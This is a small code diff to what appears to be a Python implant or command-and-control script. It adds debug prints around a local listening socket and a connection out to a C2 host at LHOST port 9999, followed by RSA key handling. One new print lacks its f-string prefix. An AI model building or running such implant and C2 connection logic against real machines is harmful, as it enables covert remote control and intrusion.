@@ -83,6 +83,7 @@ implant_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 implant_server_address = ('localhost', 10000)
 implant_socket.bind(implant_server_address)
 implant_socket.listen(1)
+print('listening for incoming connection on port 10000')
 
 start_time = 0
 while(True):
@@ -123,8 +124,9 @@ while(True):
         c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # Connect the socket to the port where the server is listening
         c2_server_address = (LHOST, 9999)
-        print("Connecting to Socket")
+        print("Connecting to Socket at {LHOST}")
         c2_socket.connect(c2_server_address)
+        
 
         #rsa key construction
         n = int(command.split(";")[1])
